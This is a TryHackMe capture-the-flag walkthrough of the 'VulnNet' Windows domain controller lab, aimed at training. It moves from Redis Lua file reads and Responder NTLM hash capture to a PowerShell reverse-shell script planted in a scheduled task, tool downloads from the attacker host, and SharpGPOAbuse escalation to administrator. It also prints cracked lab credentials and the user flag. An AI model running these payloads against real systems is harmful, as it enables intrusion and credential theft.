---
date: 2025-03-28
categories: [CTF, THM]
title: "THM - VulnNet"
tags: ['bloodhound', 'hashcat', 'impacket', 'linux', 'mimikatz', 'nmap', 'powershell', 'privilege escalation', 'rce', 'smb', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "VulnNet - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - VulnNet

NMAP

![image1](../resources/262e102caf594fe5946a4430b188d765.png)

- Run enum4linux:

```bash
enum4linux 10.10.147.23

```

![image2](../resources/9b230491f0cc462fae11a543c3acdb6a.png)

- Tried different SMB clients to connect - found nothing
- Tried using dig - Found nothing
- Tried RPC:

![image3](../resources/d564d5179f0944b7a16d158d9bdc1c73.png)

- NMAP was taking too long with -p-
- Ran rustscan instead which is FAST

```bash
rustscan -a 10.10.147.23 --ulimit 5000 -- -A

```

![image4](../resources/83c5b092bdc54461b9b5149977623534.png)

- Found more open ports to enumerate


![image5](../resources/2af25ef9376243cc8ad6d0865266df22.png)

- Connect to Redis server:

```bash
redis-cli -h 10.10.21.182

```

![image6](../resources/819b9ea1fb3b427bb5703793c8696d0a.png)
```bash
> info
```

![image7](../resources/806ff9145ed5445e96c1031239dd1f53.png)

```bash
> config get *
```

![image8](../resources/6308049dd362493ba17d89645f41db23.png)

- Found a user **enterprise-security**

- **This is an old version of Redis**

Which means we can do the LUA sandbox bypass


![image9](../resources/8b1a8b4f12e544088ee86c692e621df7.png)

[https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)

- As per the link, we can use the EVAL dofile() function to leak info
ie. EVAL "dofile('C:/Windows/System32/drivers/etc/Hosts')" 0


![image10](../resources/cfbc1c5ef5b64ec99a0bebd09128fb62.png)

- We can see from this that we aren't a priviledged user but the enterprise-security user does exist


![image11](../resources/eab49a21975c4481971b11ab08c55e7b.png)

- Since the user.txt flag is on the Desktop:

```bash
EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0

```

![image12](../resources/9fe19cdda01748a9be77fa6a949adb7e.png)

- user.txt received as error:
**3eb176aee96432d5b100bc93580b291e**

- Since we have access to browse essentially and SMB is open
- We can set up Responder and catch a NTLM hash:

```bash
sudo responder -I tun0

```
- On the redis-cli:

```bash
EVAL "dofile('//10.8.24.66/dsfsdf')" 0  #IP of my Kali tun0
```

![image13](../resources/7436b12d793f487585fc58e18644a4ac.png)


![image14](../resources/a5f0b9d99c22447397aec6605b5fec9d.png)

- Copy entire hash string (from enterprise-security to the end) put into hashes.txt

- Crack with hashcat:

```bash
hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

```

![image15](../resources/67733004f58645729e712ceadfe891e5.png)

- Got credentials: **enterprise-security : sand_0873959498**

- Test with msfconsole:


![image16](../resources/ef082ddb5bb34d8ba2cf84b487a0b895.png)

- Tried evil-winrm, all impacket modules ie. psexec, etc - Didn't work

- Run enum4linux with the credentials:

```bash
enum4linux -u enterprise-security -p sand_0873959498 -a 10.10.57.63

```

![image17](../resources/f3b626052f2d4e5ba420f27ba0911350.png)


![image18](../resources/d345baa5c86741b6b4dcc9f8fda9d5ff.png)


![image19](../resources/53eaa3848b3f4164884b0f10e0e374eb.png)


![image20](../resources/77efafa3d6c84a3cadbcf33c85649499.png)


![image21](../resources/f480966c22484fb382de2eae6abbd49c.png)

- Got some more info:

- Based on info - this is the **DC**
- Domain: **VULNNET**
- Share: **//10.10.57.63/Enterprise-Share**
- Domain users:
**tony-skid**

**krbtgt**

**jack-goldenhand**

**enterprise-security**

**Administrator**

**Guest**

- Connect to share:

```bash
smbclient //10.10.57.63/Enterprise-Share -U vulnnet/enterprise-security%sand_0873959498

```

![image22](../resources/fd4865245c4b49a2816b838b91ef3ec7.png)

- Looking at the script - it could be part of a scheduled task:

![image23](../resources/b1211cad775b44b584475d40a25068b4.png)

- Get the script onto Kali with:  

```bash
get PurgeIrrelevantData_1826.ps1

```
- Edit it with the following:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.8.24.66",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 

```
- Couldn't remove or edit the original but I could overwrite it with put

![image24](../resources/2e4d31b964ba4abc95d393416afbf89d.png)

```bash
put PurgeIrrelevantData_1826.ps1

```
- Set up nc -lnvp 4445

- Wait for the scheduled task to run:


![image25](../resources/0be806e78fb3475a82297187d597c9e0.png)


![image26](../resources/7b17d79f551645b894ef2d06a63dafe4.png)

- Upload Files (PowerView):

```bash
(New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/PowerView.ps1', 'C:\Users\enterprise-security\Downloads\PowerView.ps1')
(New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/Rubeus.exe', 'C:\Users\enterprise-security\Downloads\Rubeus.exe')
(New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/SharpHound.exe', 'C:\Users\enterprise-security\Downloads\SharpHound.exe')
(New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/mimikatz.exe', 'C:\Users\enterprise-security\Downloads\mimikatz.exe')
(New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/SharpGPOAbuse.exe', 'C:\Users\enterprise-security\Downloads\SharpGPOAbuse.exe')

```
- Run with:

```powershell
. .\PowerView.ps1
Get-NetDomainController

```

![image27](../resources/ea13ebd748c84d25b24efaa3d610a97d.png)


![image28](../resources/3ff51eb3448243958713fa92b92e6488.png)


![image29](../resources/6d7d7746604642578be5ee07a13b1083.png)

- Set up neo4j and bloodhound on Kali

- Run sharphound:

```bash
.\SharpHound.exe --CollectionMethods All --Domain vulnnet.local --ZipFileName loot.zip

```
or run with:

```powershell
powershell -ep bypass

. .\sharphound.ps1

Invoke-Bloodhound --CollectionMethods All --Domain vulnnet.local --ZipFileName loot.zip

```
- Copy loot file to SMB share:

```bash
cp 20231019030138_loot.zip C:\Enterprise-Share

```
- Get from SMB

![image30](../resources/d9df4dfd682a43ea8e0f16acadc63467.png)

- Open Bloodhound and drag and drop the loot file in

- Clicked on "Find Shortest Paths to Domain Admins"


![image31](../resources/9d4df8ea0694451486413cb14a9fb6b2.png)

- User has GenericWrite to Security-pol-vn GPO


![image32](../resources/d542bd2f30d4402da8a21b6e1842f135.png)


![image33](../resources/028598004687468baf69a1fe912eebe0.png)

- The GPO is being applied to the whole vulnnet domain  


![image34](../resources/b8fffecc650f4968a3b4c26dd1fc46ba.png)


![image35](../resources/d20f4f8a876a4ac9892bc4dffad954df.png)

- In order to leverage this vulnerability we have to use SharpGPOAbuse
<https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master>


![image36](../resources/e8cdb6fd20bf4a96bc7c2290b0719e6c.png)

- Copy SharpGPOAbuse.exe to the Windows victim machine and run:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"

```

![image37](../resources/b9a90b41a8b64b3ea1653cf7a2a54ed8.png)

```bash
gpupdate /force

```
- Check localgroup:

```bash
net localgroup administrators

```

![image38](../resources/cdda20f257454e0cafc8eee8ede93a9e.png)

- Now that we have admin privileges - Connect to the C\$ share:

```bash
smbclient //10.10.53.145/c$ -U vulnnet/enterprise-security%sand_0873959498

```

![image39](../resources/5f3398d7f6724606a2469cc204c83760.png)

And we get the flag.